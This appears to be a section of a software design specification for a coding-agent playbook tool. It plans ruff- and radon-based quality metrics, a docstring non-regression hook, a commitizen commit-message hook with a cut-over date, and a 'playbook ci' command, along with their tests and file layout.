- `ruff_violations`, `file_sloc` and `docstring_example` are in `OPT_IN_METRICS`. Reason: `ruff_violations` is available wherever ruff is on PATH (CI installs ruff via `.[dev]`), so default-selecting it would change every consumer's `playbook-metrics` pre-commit results and the finding counts asserted by `tests/cli/test_metrics.py`. A consumer opts in with `[metrics] extend_select = ["ruff_violations", "file_sloc"]`; the Stop stages select `ruff_violations` by name (F.2.2).
- `METRIC_DEFAULTS` (`policy.py:38`) gains `"ruff_violations": (None, None, 0.0)` and `"file_sloc": (None, None, 1.0)`.
- **Non-regression semantics.** Legacy violations stay silent (count unchanged); a new violation in a touched file raises the count, a regression at `max_worsening = 0`; a new file is graded absolute only when a band is configured (`_decide`'s new-scope rule, `check.py:194-196`). `file_sloc` is regression-exempt (`max_worsening = 1.0`: a drop can never exceed 1.0) and graded on new files only when a band is configured, e.g. `[metrics.thresholds.file_sloc] warn = 1.0` (> 300 SLOC) and `fail = 0.6` (> 500). It fills the one gap ruff lacks: ruff has no too-many-lines rule (verified).

Rejected alternatives:
- stdlib `function_length` / `nesting_depth` / `file_length` metrics (dropped by D-Q1);
- new optional extras (interrogate, diff-cover, wily, lizard, pylint): the only optional extra stays radon (CLAUDE.md invariant);
- a separate "clean-code" command: a second gate would duplicate `playbook metrics`.

#### F.2.2 Hook: the stage behind §E.2's `clean-code-metrics-nonregression`

No new hook id.

- **Stage `quality-metrics`.** The handler calls `run_metrics_gate(MetricsGateRequest(baseline="git:HEAD", changed_only=True, run_tests=False, selection=(<resolved [metrics] selection> ∩ family "quality") ∪ {"ruff_violations"}, config=<live [metrics]>, tool_paths=<machine.json pins>, max_files=50))`.
  - It is one in-process pass shared with the `docstrings` stage (F.3.2) through a per-fingerprint memo, so each touched file is parsed and ruff-checked once per Stop; findings are partitioned by family (`ruff:quality` vs `ruff:docstrings` scope keys).
  - **Severity** is §E.2's rule, plus one parity rule: `ruff_violations` findings are `deny`-eligible only when the consumer's own `[metrics]` selection includes `ruff_violations` (otherwise the pre-commit twin would not enforce them, and a stage is never stricter than its twin); else they are `context`.
  - Each line shows the raw `baseline → candidate`, e.g. `quality-metrics: src/x.py ruff:quality 1 → 2 (C901 parse)` and `src/x.py::parse cyclomatic_complexity 0.71 -> 0.42 (regression)`. A stage shows at most 6 lines, then `+N more (playbook metrics --changed --baseline git:HEAD)`.
- **The post-edit companion** (opt-in, §E.2) adds no metric code: it is the `quality` bucket of §E.3's single D1 ruff call (C901, PLR0911, PLR0912, PLR0913, PLR0915, changed lines only, which scopes it to new or changed functions), with `--config` thresholds rendered at sync from `[metrics.ruff_violations] config` and omitted where the project itself selects the code; PLR1702 runs only when `preview = true`, in a separate per-invocation `--preview --select PLR1702` call. It counts against §E.0.5's cap of 8 post-edit lines.

#### F.2.3 Twins

- **Pre-commit.** The existing `playbook-metrics` (`.pre-commit-hooks.yaml:38-44`) and `coding-agent-playbook-metrics` (`config.yaml.j2:29-34`) entries become `playbook metrics --baseline git:HEAD --no-run-tests` (the exact-string assertion at `tests/integration/test_precommit_hooks_yaml.py:51` is updated in the same change). Staged files are passed, as today. A consumer that opts into `ruff_violations` gets it there too.
- **CI.** The `playbook ci` `metrics` step: `playbook metrics --baseline git:<merge-base> --changed --no-run-tests`. Using the merge-base rather than `origin/<base>` keeps main's later edits out of the comparison.

#### F.2.4 Tests

- `tests/evaluators/test_ruff_violations.py` (FakeProc-scripted ruff JSON; no real ruff): counts per family; candidate and baseline argv both use stdin (`--stdin-filename`, `--force-exclude`, `--select`, `--exit-zero`); a syntax error yields no measurement; a code outside every family is ignored; `available()` is `False` without a ruff path; `--preview` appears only with `preview = true`; non-regression 0 → 0 silent, 1 → 2 fails, a new unbanded file is silent.
- `tests/evaluators/test_file_sloc.py`: `pytest.importorskip("radon")` for the measuring cases; `available()` is `False` when `importlib.util.find_spec("radon")` is `None` (monkeypatched); regression-exempt; a configured band flags a new 600-SLOC file and not a legacy one.
- `tests/evaluators/test_metric_selection.py`: select / extend / ignore; family expansion excludes opt-ins; an unknown name is a `ValueError`; an execution metric without `run_tests` is a `ValueError`; family and metric names are disjoint.
- `tests/evaluators/test_metric.py` (`:66-86`): the default static set is **unchanged** (all new metrics are opt-in).
- `tests/cli/test_metrics.py` (extend): JSON and text byte-identical after the extraction for the PR-M fixtures; `--extend-select ruff_violations` with a stubbed ruff; `--changed`; `--no-run-tests` overriding `run_tests = true` (spy: no pytest); a `json:` baseline round-trip.

### F.3 Docstrings

#### F.3.1 Tool

- **The gate is `ruff_violations` family `docstrings`** (D100–D107), non-regression versus `git:HEAD` (F.2.1). Removing a docstring, or adding an undocumented public symbol to a touched file, raises the file's D1xx count and regresses; legacy undocumented code stays silent. Publicity is ruff's pydocstyle definition, and the consumer's `[tool.ruff.lint.pydocstyle] convention` applies because the stdin path goes through project config.
- **Dropped** (D-Q1): a docstring-coverage percentage (no interrogate), the per-symbol `docstring_present` metric, `public_symbols` and signature-change re-baselining — a per-file count has no per-symbol baseline to re-baseline.
- **Strict mode — opt-in, and only if kept at all (§K).** `docstring_example` (`evaluators/builtins/docstring_example.py`, about 40 lines of stdlib `ast`): FUNCTION/METHOD scope, defs without a leading `_`; `1.0` when `ast.get_docstring(node)` holds a usage example (a doctest `>>> ` line; an `Example:`/`Examples:`/`Usage:` header; a numpy `Examples` header with a `-{3,}` underline; or a reST `::` literal block — this repo already uses `Usage::`), `0.5` for a summary only, `0.0` when missing; `Identity()` normalizer. Enabled with `[metrics] extend_select = ["docstring_example"]` and `[metrics.thresholds.docstring_example] fail = 1.0`; in regression mode it bites only new public functions.
- **Linked rule (NEW content).** `resources/rules/languages/python/docstrings.md` (id `python-docstrings`, plain markdown with no Jinja, `scope: scoped`, `globs: ["**/*.py"]`). Its body: what is public, the summary-line layout, and the example forms above. Frontmatter: `lint_codes: {warn: [D100, D101, D102, D103, D104, D105, D106, D107]}` — the §A.7 schema (SPEC §6.6 round-trip and the agent_harness sidecar).

#### F.3.2 Hook: `docstring-nonregression` (stage `docstrings`) + post-edit

`default` · `stop`, stage 3 (deterministic), plus the companion on `post_tool_use` (python-edit branch, §E.0.4): `handlers: {stop: docstring_nonregression, post_tool_use: docstring_nonregression:post_edit}` · `.py` files touched, excluding `EVAL_FIXTURE_GLOBS` and `TEST_PATH_GLOBS` · `deny` / `context`

- **Behavior.**
  - **Stop.** The stage reads the `ruff:docstrings` findings of the shared `run_metrics_gate` pass (F.2.2). Severity is §E.2's rule plus the F.2.2 parity rule (deny-eligible only when the consumer selects `ruff_violations`); otherwise `context`. Example line: `docstrings: src/x.py ruff:docstrings 0 → 1 (D103 load)`, with the ruff message quoted as data. In strict mode: `docstrings: src/x.py::load needs an intent line + one usage example (>>>, Example:, or Usage::)`.
  - **Post-edit.** It adds no logic of its own. Through the linked rule's `lint_codes` it contributes D100–D107 to the **single** shared post-edit ruff invocation (§E.3 D1: `<ruff> check --no-fix --exit-zero --force-exclude --output-format json --extend-select <U> -- <path>`). The result is changed-lines only, `context`, within the 8-line cap, and deduplicated per session. A def line counts as changed only when the def is new or its signature line was edited, so editing the body of a legacy undocumented function stays silent.
- **Implementation.**
  - Builtin handlers `docstring_nonregression` and `docstring_nonregression:post_edit` in `hook_runtime/handlers/docstring_nonregression.py`; `config.stage = "docstrings"`.
  - It reads `[metrics]` live (F.0.2).
  - `[hooks.docstring-nonregression]` = `{lint_feedback = true}`; turning it off drops the D codes from the D1 union.
  - Codes unknown to the pinned ruff are dropped at sync (§E.3).
- **Budget & failure.** Stop: about 0 extra (the shared pass). Post-edit: about 0 extra (the shared ruff call). Quality class: fails open, with one note per session (§E.0.5).
- **Guards.** It shares the block budget; it is never stricter than the repo's pre-commit gate; at most 5 lines, then `+N`; test modules and eval fixtures are never in scope.
- **Portability.** Claude: Stop and PostToolUse. OpenCode: post-edit text is appended to `output.output` in `tool.execute.after`; Stop is evidence-only. AGENTS.md line: "Give every new public function, class and module a docstring: an intent line, then one usage example."
- **Off-workstation twin.** F.3.3.
- **Tests** (`tests/hooks/test_docstring_nonregression.py`, through `simulate`, tmp git repo, stubbed ruff):
  - a new public def without a docstring gives one context line;
  - a new `_private` def is silent (ruff reports nothing);
  - a removed docstring with the metrics pre-commit hook configured and `ruff_violations` selected gives a deny line; without the selection, a context line;
  - a body-only edit of a legacy undocumented def is silent at Stop (count unchanged) and post-edit (def line unchanged);
  - strict mode with summary only gives a line;
  - a `tests/test_x.py` edit is silent;
  - post-edit: a golden ruff JSON produces D103 on the new def line only.

#### F.3.3 Twins

- **Pre-commit.** The same `playbook-metrics` hook, for consumers that select `ruff_violations`. No new id.
- **CI.** The `playbook ci` `metrics` step (F.2.3).

#### F.3.4 Tests (tool)

- `tests/evaluators/test_ruff_violations.py` (F.2.4) covers the `docstrings` family.
- `tests/evaluators/test_docstring_example.py` (only if strict mode is kept): each example form (doctest, `Example:`, `Examples:`, the numpy underline, `Usage::`) and the summary-only case.
- `tests/unit/test_rules_lint_codes.py` (extend §E.3's): `python-docstrings` round-trips its `lint_codes`.

### F.4 Commit names (addendum D-Q2, D-Q3)

#### F.4.1 Tool: commitizen, not engine code

- **`cz check` from the consumer's toolchain** (commitizen on PATH or in the dev extras), never an engine dependency and never vendored. The convention is the consumer's `[tool.commitizen]` (default `cz_conventional_commits`); structural hygiene (subject length and the like) comes from commitizen's schema / `schema_pattern` / `message_length_limit`, not from engine code.
- **No `playbook` wrapper** (D-Q2 preference). The hook and the twins call `cz` directly. The only engine logic is D-Q3's cut-over filter, which lives in the `playbook ci` step (F.5) and the hook's push scan. The previously proposed `commit_lint` package, `[commit_lint]` table, `playbook commit-lint` CLI and init survey are **dropped**.
- **Cut-over (D-Q3).** `[hooks.commit_convention] cutover_date = "YYYY-MM-DD"` (§B.1; unset ⇒ every commit is checked, the consumer default). Range checks lint only commits whose **committer** date is ≥ `cutover_date` (`git log --format='%H %cI' <base>..HEAD`, filtered), so a commit rewritten after the cut-over (rebase, amend) counts as new and must conform, while legacy history is grandfathered. The `pre_tool_use` commit check and the commit-msg twin always check (every new commit is after the cut-over). This repo's legacy `PR L: …` / `R6: …` subjects are why the cut-over exists; whether this repo itself sets `cutover_date` (to the date the hooks PR lands) depends on the dogfooding decision (§K).
- **Pinning.** `cz` is resolved at every write-mode sync (the project venv's `cz` first, else `shutil.which("cz")`) into `machine.json` `tools.cz` with its stat signature (§D.8.3). Missing or changed → fail open with the toolchain-missing-hint line (§E.3).

#### F.4.2 Hook: `commit-message-convention`

`default` · `pre_tool_use`, bash branch (§E.0.4), on the shared `shell.parse_shell` / `gitargv.parse_git` parse with wrapper prefixes such as a declared `proxy` unwrapped · segments `git [-C <dir>] commit …` with an inspectable message; `git push …` (range scan, `config.check_push`) · `deny`

- **Behavior.**
  - **Message.** `gitargv.commit_message_sources` (§E.4): `-m/--message` repeated (paragraphs joined by a blank line, as git does); `-F/--file <path>` inside the worktree, at most 64 KiB; heredoc bodies, including the `-m "$(cat <<'EOF' … EOF)"` form Claude Code uses.
  - **Decision `none` (skip, zero cz calls).** No message source (an editor would open; the commit-msg twin covers it); `-C/-c/--reuse-message/--reedit-message`; `--amend --no-edit`; `--allow-empty-message`; dynamic content the parser cannot resolve (`$VAR`, backticks, any other `$(…)`); `Uninspectable`.
  - **Commit.** `proc.run([<cz>, "check", "--message", msg], cwd=<repo root>, timeout=3)`; cz reads `[tool.commitizen]` itself. A non-zero exit → `deny`. The reason is cz's error output, sanitized (control characters stripped, at most 3 lines, the subject quoted as data and capped at 100 characters), plus `Rewrite the message to this repo's commit convention and retry.` It never points at `[tool.commitizen]` or `cutover_date`, which would teach a bypass.
  - **Push** (`check_push`, default `true`). It resolves the destination (an explicit `src:dst` refspec, else the upstream `git rev-parse --abbrev-ref @{upstream}`, else the current branch), lists `git log --format='%H %cI' <remote>/<dst>..<src>` from **local** refs only (at most 200, 3 s timeout; never a fetch), keeps the commits whose committer date is ≥ `cutover_date`, then runs one `cz check --rev-range <range>` when the kept commits are the contiguous tail of the range, else `cz check --message` per kept commit (up to 20; beyond that, one note — CI checks the full range). A missing tracking ref fails open (the CI twin covers it).
  - **cz missing** (no pin, or its signature changed) → `none` plus the once-per-session toolchain hint (§E.3).
  - It never returns `ask` (a convention is not a judgment call) and never `updatedInput` (L6), so it coexists with a user's own command-rewriting hook.
- **Implementation.** Builtin `commit_message_convention` in `hook_runtime/handlers/commit_convention.py`; `cutover_date` is rendered from `[hooks.commit_convention]` into the hook's config, `check_push` from `[hooks.commit-message-convention]`. cz runs as a subprocess, so the dispatcher imports nothing new.
- **Budget & failure.** Under 1 ms for non-matching segments (the shared prefilter). A commit costs one cz process (a Python CLI: one interpreter start, roughly 0.1–0.3 s, not yet measured); that exceeds the ≤ 100 ms pre-tool p95 only on `git commit` / `git push` segments, which are rare. 3 s timeout. Quality class: `on_error: open`, one note per session.
- **Ownership split with git-commit-push-policy-guard (E.4).** Both run on the same bash event against one shared parse, and the dispatcher folds their decisions (deny wins).

| Concern | Owner |
| --- | --- |
| identity, `--author`, `-S/--gpg-sign`, `git config user.*`, `GIT_AUTHOR_*` / `GIT_CONFIG_*` injection | git-commit-push-policy-guard |
| trailer rows (`forbid_trailers`, `allowed_coauthors`, `required_trailers`; rule ids `CP4xx`) and never-commit globs; their commit-msg twin `playbook check-commit-trailers` | git-commit-push-policy-guard |
| a commit on the default branch (`ask`); the wrong worktree (`ask`) | git-commit-push-policy-guard |
| subject and body shape — the convention, as commitizen defines it | **commit-message-convention** |

- **Portability.** A shell pre-tool, available on every hook-capable harness: Claude `PreToolUse` deny; OpenCode `tool.execute.before` throw. AGENTS.md line: "Commit messages follow this repo's commitizen convention (`cz check`); run it before committing."
- **Tests** (`tests/hooks/test_commit_message_convention.py`, golden payloads for `claude_code` and `opencode`, tmp git repo, `FakeCz` through `FakeProc`):
  - `git commit -m "Add thing."` with FakeCz rejecting → deny carrying the sanitized cz text and no mention of `[tool.commitizen]`;
  - the heredoc form → FakeCz receives the exact message;
  - `-F msg.txt` → read;
  - `proxy git commit -m "feat: y"` → none (wrapper unwrapped; FakeCz accepts);
  - `git commit --amend --no-edit`, `-m "$X"`, `echo git commit -m "bad."` → none with zero cz calls;
  - no cz pin → none plus one hint per session;
  - push with `cutover_date`: commits committed before the cut-over are not passed to cz; a rebased commit (new committer date) is; a non-contiguous kept set → per-commit `--message` calls.

#### F.4.3 Twins

- **commit-msg stage** (covers humans, editor-composed messages and hookless harnesses; no cut-over):

  ```yaml
  - id: playbook-commit-msg          # template id: coding-agent-playbook-commit-msg (repo: local)
    name: commit message convention (commitizen)
    entry: cz check --commit-msg-file   # pre-commit appends .git/COMMIT_EDITMSG
    language: system
    stages: [commit-msg]
  ```

  Added to `.pre-commit-hooks.yaml` and `resources/precommit/config.yaml.j2` (`language: system` keeps `tests/integration/test_precommit_template.py:36` green); the template gains `default_install_hook_types: [pre-commit, commit-msg]`, so a plain `pre-commit install` installs the stage. A machine without `cz` fails this human-run twin loudly ("executable not found"), which is the intended signal for a consumer that opted into commitizen.
- **CI.** The `playbook ci` `commit-convention` step (F.5): list `git log --format='%H %cI' <mb>..HEAD`, keep commits with committer date ≥ `cutover_date`; all kept → `cz check --rev-range <mb>..HEAD`; a contiguous kept tail → `cz check --rev-range <first>^..HEAD`; otherwise `cz check --message` per kept commit. In squash-merge repos the PR title is the future subject: when `PLAYBOOK_PR_TITLE` is set, the step also runs `cz check --message <title>`, with the title passed as an argv element read from the environment and **never** interpolated into a workflow `run:` line (the GitHub Actions script-injection pattern).

#### F.4.4 Tests (tool)

- `tests/cli/test_ci.py::test_commit_convention_cutover_filter` (tmp git repo with backdated `GIT_COMMITTER_DATE`; FakeProc records cz argv): only post-cut-over commits are checked; rev-range versus per-message selection; an unset cut-over checks the whole range; the PR title is an argv element; a missing `cz` fails the step.
- `tests/integration/test_precommit_hooks_yaml.py` (extend): the `expected` id set (`:65`) gains `playbook-commit-msg` (and the other new ids); it has `stages == ["commit-msg"]` and `language == "system"`; `playbook-coverage` is manual-only; both `playbook-metrics` entries carry `--no-run-tests`.

### F.5 `playbook ci`: the aggregate off-workstation twin

```
playbook ci [--base REF] [--steps STEP[,STEP…]] [--format text|json] [--repo-root DIR]
```

- **How it runs.** One required status check runs each step as a **child process** (an argv list, no shell, a per-step timeout) and aggregates the results. Engine steps run `sys.executable -m coding_agent_playbook.cli <argv>`; the commit-convention step runs `cz`.
- **Base.** `--base` defaults to `origin/<default branch>`, using the one default-branch resolver shared with E.4 and F.1 (`refs/remotes/origin/HEAD`, then `main`, then `master`). The merge-base is `git merge-base <base> HEAD`, and CI needs `actions/checkout` with `fetch-depth: 0`.
- **Exit codes.** `0` when every run step passed; `1` when any failed; `2` on a usage error. JSON gives per-step `{step, argv, exit, duration_s}`.
- **Steps.** The step table lives in `commands/ci.py::CI_STEPS` *(NEW)*, an ordered tuple of `(name, owner, argv-builder, enabled-predicate)`. Other sections add rows here instead of a second CI entry point.

| Step | argv | Enabled when | Owner |
| --- | --- | --- | --- |
| `sync-check` | `sync --check` (orphans included, P2) | always | prerequisites |
| `validate` | `validate` | always | existing |
| `metrics` | `metrics --baseline git:<mb> --changed --no-run-tests` | always | F.2 / F.3 |
| `coverage` | `metrics --run-tests --select testing --baseline git:<mb>` | `[metrics] run_tests = true` or `--steps coverage` | F.1 |
| `commit-convention` | the cut-over-filtered `cz check` sequence (F.4.3); a missing `cz` **fails** the step (CI is the authoritative twin) | `[tool.commitizen]` exists in `pyproject.toml` or `[hooks.commit_convention]` is set | F.4 |
| `commit-trailers` | `check-commit-trailers` over `<mb>..HEAD` | a git-commit-push-policy-guard trailer row is configured | E.4 |
| `scan-secrets`, `check-deps`, `gate-scan` | as their sections define | per their sections | E.4 / E.2 |

A consumer's workflow gains a `pull_request`-only job that runs `playbook ci` with `PLAYBOOK_PR_TITLE: ${{ github.event.pull_request.title }}` in `env:`. Whether this engine repo's own `.github/workflows/ci.yml` gains that job is part of the dogfooding decision (§K); the existing ruff, mypy and pytest matrix stays authoritative for CI parity either way.

### F.6 Files (NEW unless noted)

Track placement follows §H: K10 owns these files, except where a row names another track.

| Path | Purpose |
| --- | --- |
| `src/coding_agent_playbook/evaluators/metrics_gate.py` | the extracted gate (F.0.3 item 1), `MetricsGateRequest.tool_paths`; **lands in Track P** (P-D3, PR Pb), and K10 extends it |
| `src/coding_agent_playbook/evaluators/paths.py` | `TEST_PATH_GLOBS`, `EVAL_FIXTURE_GLOBS`, `is_test_path` |
| `src/coding_agent_playbook/evaluators/policy.py` (changed) | the new `METRIC_DEFAULTS` rows; `OPT_IN_METRICS`, `METRIC_FAMILIES`, `resolve_metric_selection` |
| `src/coding_agent_playbook/evaluators/types.py` (changed) | `MetricConfig` gains `select`, `extend_select`, `ignore`, `exclude`, `git_timeout_s`, `test_timeout_s`, `ruff_families`, `ruff_config`, `ruff_preview`; `EvalContext.tool_paths` |
| `src/coding_agent_playbook/evaluators/metric.py` (changed) | the `diff_based: bool = False` descriptor |
| `src/coding_agent_playbook/evaluators/builtins/{ruff_violations,file_sloc,docstring_example}.py` | the three new static metrics (`docstring_example` only if strict mode is kept) |
| `src/coding_agent_playbook/evaluators/builtins/__init__.py` (changed) | register the new modules |
| `src/coding_agent_playbook/evaluators/execution/{diff_coverage,git_diff}.py` | `diff_coverage` + `changed_line_coverage`; `changed_lines` |
| `src/coding_agent_playbook/evaluators/execution/{coverage_xml,project,__init__}.py` (changed) | `lines` / `sources`; `diff_base` / `timeout_s` / `env_overrides`; registration |
| `src/coding_agent_playbook/evaluators/checks/execution.py` (changed, `:47`) | the `warn=0.8` fix |
| `src/coding_agent_playbook/commands/ci.py` | `playbook ci` and `CI_STEPS`; **created in K6** (rows `sync-check`, `validate`, `gate-scan`), and K10 appends the `metrics`, `coverage` and `commit-convention` rows |
| `src/coding_agent_playbook/commands/metrics.py` (changed) | thin CLI (Track P, P-D3, PR Pb); new flags (K10) |
| `src/coding_agent_playbook/cli.py` (changed, `:37`, `:164-207`) | `ci` in `_SUBCOMMANDS` (K6, with `gate-scan`), and the new metrics flags (K10) (with the `tests/unit/test_cli.py` assertion) |
| `src/coding_agent_playbook/config.py` (changed) | `parse_metrics_config` new keys and the `[metrics.ruff_violations]` sub-table |
| `src/coding_agent_playbook/detector.py` (changed, `:386`) | the `has_dev_dependency` predicate key |
| `src/coding_agent_playbook/resources/rules/languages/python/docstrings.md` | the `python-docstrings` rule with `lint_codes` |
| `src/coding_agent_playbook/resources/hooks/verify/{coverage-diff-gate,docstring-nonregression}/HOOK.md`, `resources/hooks/safety/commit-message-convention/HOOK.md` | the `Hook` artifacts (§A.1 directory form; body is the AGENTS.md advisory) |
| `src/coding_agent_playbook/hook_runtime/handlers/{coverage_diff_gate,docstring_nonregression,commit_convention}.py` | builtin handlers (`@register_hook_handler("<snake_name>")`, §A.2) |
| `.pre-commit-hooks.yaml`, `resources/precommit/config.yaml.j2` (changed) | `playbook-coverage`, `playbook-commit-msg` / `coding-agent-playbook-commit-msg`, `--no-run-tests`, `default_install_hook_types` |
| `tests/…` | as listed in F.1.4, F.2.4, F.3.2, F.3.4, F.4.2 and F.4.4 |

### F.7 SPEC and documentation amendments

- **§21.2.1.** Add the `ruff_violations` (subprocess wrapper; per-family scope keys; stdin on both sides) and `file_sloc` (radon, regression-exempt) rows, and `docstring_example` if kept.
- **§21.2.2.** Add the `diff_coverage` row, the `diff_based` descriptor, the `CoverageReport.lines` / `sources` fields, the new `ProjectHandle` fields, the `default_test_cmd(python=, cov_sources=)` arguments and the `COVERAGE_FILE` isolation.
- **§21.3.** Add `resolve_metric_selection`, `METRIC_FAMILIES` and `OPT_IN_METRICS`. Selection is policy, not a `Metric` descriptor.
- **§21.5.**
  - New flags: `--select`, `--extend-select`, `--ignore`, `--changed`, `--run-tests/--no-run-tests`, `--baseline json:PATH`, `--emit-measurements`.
  - The new usage errors; the `metrics_gate.py` extraction.
  - The pre-commit paragraph gains `--no-run-tests` and the manual `playbook-coverage` hook.
- **§21.7.** Add the `file_sloc` `max_worsening=1.0` exception, "ruff is a consumer-toolchain subprocess, never an engine import; radon stays the only optional extra", and "tool policy has one source shared by CLI, pre-commit, CI and hooks".
- **§21.8.** Caveats: `ruff_violations` counts are per file and family, so moving a violation between functions is invisible; `diff_coverage` reports files outside the measured sources as unmeasured; MI non-regression is volatile on any growth. (Do not mention the deleted R6 symbols bare: `tests/unit/test_docs_check_rubric_refactor.py` scans the §21 body.)
- **§12.** Add `§12.11 playbook ci`, plus a `§12.12` pointer to §21.5 for `playbook metrics`. §12 has no metrics entry today.
- **§13.1.** This snippet is stale: it lacks `playbook-metrics`, which `.pre-commit-hooks.yaml:38` already ships. Add `playbook-metrics` (with `--no-run-tests`), `playbook-coverage` and `playbook-commit-msg`.
- **§13.2.** The template gains `default_install_hook_types`, `coding-agent-playbook-commit-msg` and the manual `coding-agent-playbook-coverage`.
- **§7.1 / §7.2.** Add the new `[metrics]` keys, `[metrics.ruff_violations]`, and `[hooks.commit_convention]`; state that `.local.toml` is ignored for the tool tables.
- **§6.4.** Add `has_dev_dependency`.
- **§0 changelog and MIGRATION.md.** The new opt-in metrics and how to select them; the `CoverageCheck` fix; `--no-run-tests` on the metrics pre-commit hooks; commitizen as the commit-convention tool.
- **README.** The metrics table, the "Clean Code for AI Agents preset" snippet (`[metrics] extend_select` + `[metrics.ruff_violations] config` + the `file_sloc` band), commitizen setup with `cutover_date`, and `playbook ci`.

### F.8 Decisions taken in §F (with rationale)

1. **Reuse, don't reimplement (D-Q1/D-Q2).** Quality and docstrings wrap ruff; file length wraps radon raw SLOC; changed-line coverage reuses `coverage_xml.py` + `git diff -U0`; commit naming is commitizen. Optional extras stay radon only.
2. **Coverage hook is opt-in and trust-gated.** It executes repo code, costs a suite run, and CI is authoritative. It grades **changed-line** coverage, which needs one run, and checks total non-regression only against a cached snapshot.
3. **New metrics are opt-in in the selection.** `ruff_violations`, `file_sloc` and `docstring_example` never change existing consumers' pre-commit results on upgrade; the Stop stages select `ruff_violations` by name but are `deny`-eligible only when the consumer selects it too.
4. **Feedback and gate share one policy.** Post-edit feedback is the shared D1 ruff call; the Stop gate is `ruff_violations` non-regression; both read `[metrics.ruff_violations]`.
5. **Commit naming has no engine linter.** `cz check` everywhere; the engine adds only the committer-date cut-over filter (D-Q3) in `playbook ci` and the push scan.
6. **Tool policy is read live; executable paths never are.** Policy tables are read live for parity with their twins; tool paths are per-worktree pins; `.local.toml` never applies to tool tables.

### F.9 Open questions

The authoritative, deduplicated list is §K; these are its §F sources.

- **Q-F1 (L9): the default commit convention.** *Closed by D-Q2/D-Q3*: commitizen's `cz_conventional_commits` unless the consumer configures `[tool.commitizen]`, plus `cutover_date`.
- **Q-F2: subject length.** *Closed*: a commitizen schema concern (`message_length_limit` / `schema_pattern`), not engine config.
- **Q-F3: default selection of the new metrics.** Proposed: opt-in (F.2.1) so consumers' `playbook-metrics` pre-commit results are byte-stable on upgrade. Alternative: default-select `ruff_violations` with a MIGRATION note. Confirm.
- **Q-F4: regression tolerance for `ruff_violations`.** With `max_worsening = 0`, one new violation in a touched file fails. Keep the §21.7 exact-compare invariant (proposed)?
- **Q-F5: live-read exception.** Extending §E.0.2's live `[metrics]` read to the `docstrings` and `coverage` stages. Accept (proposed), or bake `[metrics]` into `guard_config.json` and accept hook/twin drift until the next sync?
- **Q-F6: the `coverage` and `tests` stage interplay.** When coverage is enabled, F.1.2 forces stop-ci-parity-gate's `tests` stage to a full-suite `ProjectHandle` run with coverage (`tests_scope = "all"`). §E.2 owns the `tests` stage and its `--no-cov` targeted mode; confirm.
- **Q-F7: strict docstring mode.** Keep `docstring_example` (about 40 stdlib lines, opt-in), or drop it and leave "intent + usage example" to the rule text only (D-Q1: "only if kept at all")?
- **Q-F8: ownership of `playbook ci`.** *Resolved*: §F.5.

---

## §H (pack tracks)

The track overview table (all tracks, with their dependencies, sizes and key files), the phase order, the track-level placement decisions and the integration rule are in [part 1 §H](prK-lifecycle-hooks.md#h--tracks), together with the Track P, K1–K4 and K11 subsections. The Track K5–K10 subsections follow; their dependencies are the "Depends on" column of that table.

### Track K5 — Pack: protect

- **What.** The 8 §E.1 hooks: guard-generated-outputs, control-plane-guard, stop-drift-and-orphan-gate (stage `drift`, built against K2's `Stage` contract and wired into the coordinator in K6), validate-then-sync-on-canonical-edit, resync-on-detector-input-change, session-start-playbook-briefing (heartbeat canaries), eval-task-authoring-lint and guard-eval-fixtures. The `lockfile.drift_entries` extraction is shared with `playbook check`.
- **Files.** **New:** `resources/hooks/protect/<id>/HOOK.md` × 8, `hook_runtime/protected.py`, and `hook_runtime/handlers/<handler>.py` per entry (snake_case handler names, §A.2). **Modified:** `lockfile.py` (`drift_entries`), `commands/check.py` (calls it), `guard_config.py` (`sentinel`, `protected`, `control_plane`, `precommit`, `facts`, `applicability`, `eval`), `hook_runtime/canary.py` (canary payloads).
- **Tests.** `tests/hooks/test_<hook_id_snake>.py` × 8, through `playbook-hook simulate` with golden payloads for both harnesses (§E.0.7), plus `tests/cli/test_check.py` (drift parity with the shared helper).
- **Done when.** Every §E.1 test list passes; `jinja2` is absent from `sys.modules` after a source-changed dispatch; the protected set is derived only from the lockfile and adapters' output directories (no render, no subprocess on the deny path).

### Track K6 — Pack: verify, Stop coordinator, `playbook ci`

- **What.** `StopCoordinator.run` (block budget, fingerprint rules, plan-mode and kill-switch skips, `compose`) and the ≤ 40-line combined reason (§D.5.1, §D.5.4–§D.5.6); the 7 §E.2 hooks: stop-ci-parity-gate (stages `lint`, `verify-claim`, `typecheck`, `tests`; the lint baseline over a `git archive` export), clean-code-metrics-nonregression's `quality-metrics` stage (existing static metrics through `run_metrics_gate(run_tests=False)`; `ruff_violations` joins in K10), block-precommit-bypass, gate-weakening-guard (`gate_scan.py`, `playbook gate-scan`, the `pre_edit` companion), tests-with-source-nudge, subagent-stop-verify and prompt-output-contract-on-stop (`PromptFrontmatter.output_contract` + sidecar + validate compile + the contracts for `review`, `security-review`, `find-injected-vulnerability`). `playbook ci` with `CI_STEPS` rows `sync-check`, `validate`, `gate-scan`.
- **Files.** **New:** `hook_runtime/stop/{coordinator,output}.py`, `resources/hooks/verify/<id>/HOOK.md` × 7, `hook_runtime/handlers/<handler>.py` per entry, `src/coding_agent_playbook/gate_scan.py`, `commands/ci.py`. **Modified:** `types.py` (`PromptFrontmatter` `:128` gains `output_contract`), `harness/manifest.py` and `commands/import_harness.py` (`_prompt_from_entry`), `commands/validate.py` (compiles `output_contract`), `cli.py` (`_SUBCOMMANDS` `:37-47` gains `gate-scan` and `ci`), `tests/unit/test_cli.py`, `guard_config.py` (`stop_gate`, `prompts`), `resources/prompts/{review.md.j2,security-review.md.j2,find-injected-vulnerability.md.j2}` (`output_contract`).
- **Tests.** `tests/hook_runtime/test_stop_coordinator.py` (NEW; the §D.9 coordinator table with `FakeGit` + `FakeStageRunner`), `tests/hooks/test_<hook_id_snake>.py` × 7, `tests/cli/test_gate_scan.py` (NEW; `--range HEAD~1..HEAD` exits 1 on the fixture), `tests/cli/test_ci.py` (NEW; child-process steps, aggregated exit code, JSON per-step records), `tests/harness/test_manifest_roundtrip.py` (`output_contract`).
- **Done when.** Three red stages produce exactly one combined reason ≤ 40 lines; a second Stop on the same fingerprint gives none plus `NOT verified`; an untrusted repo never invokes the execution stages; `[metrics] run_tests = true` never runs a suite from the hook; the output-contract stage is verified end to end once K7's active-prompt record lands (OQ-45).

### Track K7 — Pack: feedback and the shared ruff call

